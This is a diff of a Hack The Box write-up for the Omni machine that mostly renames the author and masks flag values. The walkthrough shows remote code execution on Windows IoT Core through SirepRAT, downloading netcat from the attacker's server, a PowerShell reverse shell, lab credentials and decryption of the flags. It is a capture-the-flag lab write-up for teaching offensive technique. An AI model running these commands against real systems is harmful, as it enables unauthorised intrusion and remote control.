@@ -9,6 +9,7 @@ avatar: assets/htb/omni.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Omni
 ---
+
 ## Enumeration
 
 ### Nmap scan
@@ -16,9 +17,9 @@ htb_url: https://app.hackthebox.com/machines/Omni
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni]
+┌──(kac0㉿kali)-[~/htb/omni]
 └─$ sudo nmap -sSCV -p- -n -v -oA omni <YOUR_IP>
-[sudo] password for zweilos: 
+[sudo] password for kac0: 
 \Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 19:15 EDT
 NSE: Loaded 151 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -96,9 +97,9 @@ There were a few standard Windows ports such as 135 - RPC, 3895 - Windows Remote
 
 I started out my enumeration with the web server on port 8080.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-windows-device-portal.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-windows-device-portal.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-auth-required.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-auth-required.png)
 
 "Windows Device Portal" - Needs credentials to log in
 
@@ -111,7 +112,7 @@ unfortunately the owners have changed the default password
 [https://www.thomasmaurer.ch/2015/06/how-to-connect-to-windows-10-iot-core-via-powershell/](https://www.thomasmaurer.ch/2015/06/how-to-connect-to-windows-10-iot-core-via-powershell/)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni]
+┌──(kac0㉿kali)-[~/htb/omni]
 └─$ pwsh                                                             
 PowerShell 7.0.0
 Copyright (c) Microsoft Corporation. All rights reserved.
@@ -119,7 +120,7 @@ Copyright (c) Microsoft Corporation. All rights reserved.
 https://aka.ms/powershell
 Type 'help' to get help.
 
-PS /home/zweilos/htb/omni> Enter-PSSession -ComputerName <YOUR_IP> -Credential <YOUR_IP>\Administrator
+PS /home/kac0/htb/omni> Enter-PSSession -ComputerName <YOUR_IP> -Credential <YOUR_IP>\Administrator
 
 PowerShell credential request
 Enter your credentials.                                              
@@ -132,7 +133,7 @@ denied again...I need to find the password to continue
 [https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/](https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> --help                                                          2 ⨯
 usage: SirepRAT.py target_device_ip command_type [options]
 
@@ -168,7 +169,7 @@ remarks:
 
 Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path C:\Windows\System32\hostname.exe
 
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> GetSystemInformationFromDevice
 <SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>
 ```
@@ -176,7 +177,7 @@ Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path C
 There aren't a lot of useful files that have known locations on a windows machine so I tried to grab the hosts file in `C:\Windows\System32\drivers\etc\`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
 ---------
 # Copyright (c) 1993-2009 Microsoft Corp.
@@ -209,7 +210,7 @@ There aren't a lot of useful files that have known locations on a windows machin
 Next I had to try running commands to see what privileges I actually had
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c set" --v                                                                  
 ---------
 ALLUSERSPROFILE=C:\Data\ProgramData
@@ -253,7 +254,7 @@ windir=C:\windows
 First I ran the `set` command, which returned a list of the local environment variables
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c set" --v
 ---------
 AllUsersProfile=C:\Data\ProgramData
@@ -297,7 +298,7 @@ windir=C:\windows
 Next I ran the same command to see if there was any difference in using the `--as_logged_on_user` flag. I noticed that there seemed to be a user called "DefaultAccount" logged in
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " -c whoami /all" --v
 ---------
 Microsoft Windows [Version 10.0.17763.107]
@@ -312,7 +313,7 @@ C:\windows\system32>
 My context seems to be running commands as System, so this should be a quick and easy win...right? \(failed to notice this was still "logged on user"\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe" --v 
 ---------
 Windows PowerShell 
@@ -330,7 +331,7 @@ PS C:\windows\system32>
 A little bit of testing shows that I can run PowerShell
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe wget http://10.10.15.105:8099/nc64.exe -Outfile nc64.exe" --v
 ---------
 wget : The term 'wget' is not recognized as the name of a cmdlet, function, 
@@ -352,7 +353,7 @@ At line:1 char:1
 wget as an alias is not configured...this may be a limited version of PowerShell
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe Invoke-WebRequest http://10.10.15.105:8099/nc.exe -Outfile nc.exe" --v 
 ---------
 Invoke-WebRequest : Access to the path 'C:\windows\system32\nc.exe' is denied.
@@ -373,11 +374,11 @@ At line:1 char:1
 so maybe I am not running as System as thought, since I was unable to write to the System32 folder \(the folder I was in by default.\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe mkdir C:\temp" --v                              
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ python3 -m http.server 8099
 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 
@@ -387,7 +388,7 @@ Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 ^C
 Keyboard interrupt received, exiting.
 
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe Invoke-WebRequest http://10.10.15.105:8099/nc.exe -Outfile C:\temp\nc.exe" --v
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 ```
@@ -395,7 +396,7 @@ Keyboard interrupt received, exiting.
 Since I could not write to the current folder, I simply made a temp directory and uploaded my nc.exe there
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni/SirepRAT]
+┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
 └─$ python SirepRAT.py <YOUR_IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c PowerShell.exe  C:\temp\nc64.exe 10.10.15.105 55541 -e Powershell.exe" --v
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 ```
@@ -405,7 +406,7 @@ After uploading netcat to the `temp` folder I created I sent a reverse shell bac
 ## Road to User
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni]
+┌──(kac0㉿kali)-[~/htb/omni]
 └─$ nc -lvnp 55541        
 listening on [any] 55541 ...
 ^[[Aconnect to [10.10.15.105] from (UNKNOWN) [<YOUR_IP>] 49711
@@ -794,7 +795,7 @@ At line:1 char:1
 hmm it seems like I cannot run commands as another user. I need to find a way to login as the other two users
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/omni]
+┌──(kac0㉿kali)-[~/htb/omni]
 └─$ evil-winrm -i <YOUR_IP> -u app -p mesh5143                                
 
 Evil-WinRM shell v2.3
@@ -811,55 +812,55 @@ I tried logging in with WinRM but got an error. Looking at my nmap output again 
 
 ### Port 8080 - Web Portal
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-loggin-in.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-loggin-in.png)
 
 Logged in using `app`'s credentials.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-windows-dive-portal.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-windows-dive-portal.png)
 
 Web portal for managing the IOT device
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-app-install.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-app-install.png)
 
 Apps running on the device
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-interesting-processes.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-interesting-processes.png)
 
 Running Processes
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-another-password.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-another-password.png)
 
 Found another password in the AllJoyn SoftAP settings
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-performance-monitor.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-performance-monitor.png)
 
 Device performance monitor
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-set-app.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-set-app.png)
 
 Was able to run commands directly in the portal. Using the command `set` I was able to list all of the currently set environment variables, including the current user context I was running in.
 
 ## User.txt
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-user-flag.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-user-flag.png)
 
 Since I was running as `app` and could execute arbitrary commands I tried again to see if I could decrypt the user.txt flag.
 
 ```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\app\user.txt; $credential.GetNetworkCredential().Password }
 
-7cfd****9d70
+7cfd************************9d70
 ```
 
 I was able to successfully decrypt the flag!
 
 ## Further Enumeration
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-administrator-logged-in.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-administrator-logged-in.png)
 
 next I cleared my cookies for the site, closed and reopened the browser, then logged in as `administrator` to see if the same process could be done for the `root.txt`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-hardening-txt.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-hardening-txt.png)
 
 ```text
 Command> type C:\Data\Users\app\hardening.txt
@@ -909,10 +910,10 @@ I still wasn't able to decode `iot-admin.xml` for some reason
 
 ## Root.txt
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-admin-pwned.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-admin-pwned.png)
 
 ```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt; $credential.GetNetworkCredential().Password }
 
-5dbd****f11d
+5dbd************************f11d
 ```
